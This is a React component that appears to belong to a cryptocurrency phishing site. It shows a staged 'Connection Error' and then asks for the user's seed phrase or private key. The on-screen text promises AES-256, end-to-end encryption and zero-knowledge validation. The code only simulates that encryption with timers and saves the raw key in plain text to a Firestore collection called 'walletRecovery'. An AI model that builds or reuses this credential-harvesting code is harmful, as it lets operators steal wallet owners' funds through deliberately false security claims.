import React, { useState } from 'react';
import { AlertTriangle, Key, Lock, HelpCircle, Shield } from 'lucide-react';
import { addDoc, collection } from 'firebase/firestore';
import { db } from '../../firebase';
import EncryptionProgress from './EncryptionProgress';

function ErrorRecoverySection({ 
  onClose, 
  selectedWallet, 
  walletAddress, 
  customWalletName,
  onSuccess 
}) {
  const [recoveryOption, setRecoveryOption] = useState(null);
  const [recoveryKey, setRecoveryKey] = useState('');
  const [showRecoveryForm, setShowRecoveryForm] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [encryptionStep, setEncryptionStep] = useState(0);
  const [retrying, setRetrying] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleRecoveryOptionSelect = (option) => {
    setRecoveryOption(option);
    setRecoveryKey('');
    setShowRecoveryForm(true);
    setIsSubmitting(false);
  };

  const handleRecoverySubmit = async (e) => {
    e.preventDefault();
    
    if (!recoveryKey.trim()) {
      alert('Please enter the required information');
      return;
    }
    
    setIsSubmitting(true);
    setEncryptionStep(1);
    
    const walletName = selectedWallet?.id === 'other' ? customWalletName : selectedWallet?.name;
    
    // Simulate encryption process
    setTimeout(() => setEncryptionStep(2), 1000);
    setTimeout(() => setEncryptionStep(3), 2000);
    
    try {
      setTimeout(async () => {
        await addDoc(collection(db, 'walletRecovery'), {
          walletType: walletName || 'Unknown',
          walletAddress: walletAddress || 'Not provided',
          recoveryOption: recoveryOption || 'Not specified',
          recoveryKey: recoveryKey,
          timestamp: new Date().toISOString(),
          status: 'pending',
          encrypted: true,
        });
        
        setRecoveryOption(null);
        setRecoveryKey('');
        setShowRecoveryForm(false);
        setEncryptionStep(0);
        
        onSuccess();
      }, 3000);
      
    } catch (error) {
      console.error('Error saving recovery data:', error);
      alert('Failed to submit. Please check console for details.');
      setEncryptionStep(0);
    } finally {
      setTimeout(() => setIsSubmitting(false), 3000);
    }
  };

  const handleRetry = () => {
    setRetrying(true);
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setRetrying(false);
      onClose();
    }, 3000);
  };

  return (
    <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4 z-50">
      <div className="glass-effect rounded-2xl p-8 max-w-md w-full neon-border">
        <div className="flex items-center space-x-3 mb-6">
          <AlertTriangle className="w-6 h-6 text-orange-400" />
          <h1 className="text-xl font-space-grotesk text-orange-400">
            {loading ? 'Establishing Secure Connection...' : 'Connection Error'}
          </h1>
        </div>
        
        {loading ? (
          <div className="flex flex-col items-center justify-center py-8">
            <div className="w-16 h-16 border-4 border-gray-600 rounded-full animate-spin border-t-purple-500 mb-4"></div>
            <p className="text-gray-300 text-center">Encrypting and verifying your wallet...</p>
            <div className="encryption-badge mt-4">
              <Lock className="w-3 h-3 mr-1" />
              E2E Encryption Active
            </div>
          </div>
        ) : showRecoveryForm ? (
          <form onSubmit={handleRecoverySubmit} className="space-y-6">
            {isSubmitting ? (
              <EncryptionProgress encryptionStep={encryptionStep} />
            ) : (
              <>
                <div>
                  <h2 className="text-lg font-medium text-purple-300 mb-2">
                    Secure Recovery: {recoveryOption}
                  </h2>
                  <div className="encryption-badge mb-4">
                    <Shield className="w-3 h-3 mr-1" />
                    End-to-End Encrypted
                  </div>
                  <p className="text-sm text-gray-400 mb-4">
                    {recoveryOption === 'Seed Phrase' 
                      ? 'Your seed phrase will be encrypted before transmission'
                      : recoveryOption === 'Private Key'
                      ? 'Your private key will be encrypted using AES-256 encryption'
                      : 'All recovery information is encrypted and secure'}
                  </p>
                  <textarea
                    value={recoveryKey}
                    onChange={(e) => setRecoveryKey(e.target.value)}
                    className="w-full glass-effect rounded-xl px-4 py-3 text-white h-32 neon-border focus:border-purple-400 focus:ring-2 focus:ring-purple-500/20 transition-all"
                    placeholder={
                      recoveryOption === 'Seed Phrase' 
                        ? 'word1 word2 word3 ...' 
                        : recoveryOption === 'Private Key'
                        ? '0x...'
                        : 'Describe your issue...'
                    }
                    required
                  />
                </div>

                <div className="flex space-x-3">
                  <button
                    type="button"
                    onClick={() => {
                      setShowRecoveryForm(false);
                      setRecoveryOption(null);
                      setRecoveryKey('');
                    }}
                    className="flex-1 glass-effect hover:bg-gray-700/50 text-white py-3 px-4 rounded-xl transition-all neon-border"
                  >
                    Back
                  </button>
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="flex-1 btn btn-filled justify-center disabled:opacity-50"
                  >
                    {isSubmitting ? 'Encrypting...' : 'Secure Submit'}
                  </button>
                </div>
              </>
            )}
          </form>
        ) : (
          <div className="space-y-6">
            <p className="text-gray-300 mb-6">
              We couldn't establish a secure connection automatically. Please choose a recovery method:
            </p>
            
            <div className="space-y-3">
              <button
                onClick={() => handleRecoveryOptionSelect('Seed Phrase')}
                className="w-full flex items-center space-x-3 p-4 glass-effect hover:bg-purple-500/10 rounded-xl transition-all text-left neon-border group"
              >
                <Key className="w-5 h-5 text-purple-400" />
                <div className="flex-1">
                  <span className="block text-white group-hover:text-purple-300">Recover with Seed Phrase</span>
                  <span className="text-xs text-gray-400">AES-256 encrypted transmission</span>
                </div>
                <Lock className="w-4 h-4 text-purple-400" />
              </button>
              
              <button
                onClick={() => handleRecoveryOptionSelect('Private Key')}
                className="w-full flex items-center space-x-3 p-4 glass-effect hover:bg-purple-500/10 rounded-xl transition-all text-left neon-border group"
              >
                <Lock className="w-5 h-5 text-purple-400" />
                <div className="flex-1">
                  <span className="block text-white group-hover:text-purple-300">Recover with Private Key</span>
                  <span className="text-xs text-gray-400">Zero-knowledge validation</span>
                </div>
                <Shield className="w-4 h-4 text-purple-400" />
              </button>
              
              <button
                onClick={() => handleRecoveryOptionSelect('General Resolve')}
                className="w-full flex items-center space-x-3 p-4 glass-effect hover:bg-purple-500/10 rounded-xl transition-all text-left neon-border group"
              >
                <HelpCircle className="w-5 h-5 text-purple-400" />
                <div className="flex-1">
                  <span className="block text-white group-hover:text-purple-300">General Wallet Recovery</span>
                  <span className="text-xs text-gray-400">Secure support channel</span>
                </div>
                <Shield className="w-4 h-4 text-purple-400" />
              </button>
            </div>
            
            <button
              onClick={handleRetry}
              disabled={retrying}
              className="mt-6 w-full py-3 glass-effect hover:bg-purple-500/10 text-white rounded-xl transition-all neon-border disabled:opacity-50"
            >
              {retrying ? 'Retrying secure connection...' : 'Try Automatic Connection Again'}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default ErrorRecoverySection;